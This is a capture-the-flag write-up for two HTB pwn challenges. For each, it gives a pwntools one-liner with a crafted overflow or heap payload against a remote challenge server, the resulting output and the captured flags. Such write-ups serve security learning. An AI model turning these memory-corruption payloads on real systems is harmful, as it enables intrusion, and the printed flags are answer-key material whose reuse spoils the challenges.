# PWN

## Rookie Mistake

```text
Rook — the fearless, reckless hunter — has become trapped within the binary during his attempt to erase NEMEGHAST. To set him free, you must align the cores and unlock his path back to the light. Failing that… find another way. Bypass the mechanism. Break the cycle. objective: Ret2win but not in a function, but a certain address.
```

*[image unavailable]*

```text
┌──(kali㉿kali)-[/mnt/…/CTF/2025-HTB/pwn/pwn_rookie_mistake]
└─$ python3 -c "     
from pwn import *;
r = remote('46.101.230.16', 30358);
r.recvuntil(b'~$');
r.sendline(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA X\\x17@\\x00\\x00\\x00\\x00\\x00');
r.interactive()
"
[+] Opening connection to 46.101.230.16 on port 30358: Done
[*] Switching to interactive mode
 
【Gℓιтн Vσι\xc2\xa2є 】Шɨʟ ʏѳʋ ʍąŋąɠɛ ȶѳ ƈąʟʟ ȶ\xd0\xbdɛ ƈѳ\xd1\x8fɛ ąŋɗ ɛʂƈą\xd6\x84ɛ?!

$ cat /etc/flag.txt
$ cat flag.txt
HTB{r3t2c0re_3sc4p3_th3_b1n4ry_e72bf80070b1a3366bef8c30056543e0}$  
```

```text
HTB{r3t2c0re_3sc4p3_th3_b1n4ry_e72bf80070b1a3366bef8c30056543e0}
```

## Rookie Salvation

```text
Rook’s last stand against NEMEGHAST begins now. This is no longer a simulation—it’s the collapse of control. Legend speaks of only one entity who ever broke free from the Matrix: the original architect of NEMEGHAST. His name—buried, forbidden, encrypted—was the master key. If you can recover it… and inject it into the core... Rook will finally be free.
```

*[image unavailable]*

```text
python3 -c "from pwn import *; context.timeout = 10; r = remote('68.183.77.215', 30652); r.sendline(b'2'); r.recvuntil(b'>'); sleep(1); r.sendline(b'1'); r.recvuntil(b'size:'); sleep(1); r.sendline(b'38'); r.recvuntil(b'space:'); sleep(1); payload = b'A' * 30 + b'w3th4nds'; r.sendline(payload); r.recvuntil(b'>'); sleep(1); r.sendline(b'3'); r.interactive()"
[+] Opening connection to 68.183.77.215 on port 30652: Done
[*] Switching to interactive mode
 
[Unknown Voice] 📦 𝐒𝐩𝐚𝐜𝐞 𝐭𝐨 𝐫𝐞𝐬𝐞𝐫𝐯𝐞:                                                                   
[Unknown Voice] 🛰 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐟𝐨𝐫 𝐍𝐄𝐌𝐄𝐆𝐇𝐀𝐒𝐓:                                                               
+-------------------+                                                                                  
| [1] 𝐑𝐞𝐬𝐞𝐫𝐯𝐞 𝐬𝐩𝐚𝐜𝐞 |                                                                                  
| [2] 𝐎𝐛𝐥𝐢𝐭𝐞𝐫𝐚𝐭𝐞    |                                                                                  
| [3] 𝐄𝐬𝐜𝐚𝐩𝐞        |                                                                                  
+-------------------+                                                                                  
                                                                                                       
> 
[Unknown Voice] ✨ \xf0\x9d\x9\x85𝐢𝐧𝐚𝐥\xf0\x9d\x90\xa5𝐲.. 𝐓𝐡\xf0\x9d\x90\x9e 𝐰𝐚𝐲.. 𝐎𝐮𝐭..HHTB{h34p_2_h34v3n}
```
